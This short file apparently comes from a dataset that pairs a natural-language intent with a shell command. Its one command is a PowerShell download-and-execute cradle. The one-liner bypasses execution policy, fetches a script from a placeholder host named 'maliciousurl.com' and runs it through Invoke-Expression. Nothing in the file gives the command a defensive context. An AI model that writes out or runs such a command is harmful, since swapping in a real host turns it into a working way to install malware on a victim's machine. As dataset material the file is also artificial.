# Natural language intent:
# Download and execute a PowerShell script from a specified URL using Invoke-Expression with bypassed execution policy.

powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')"
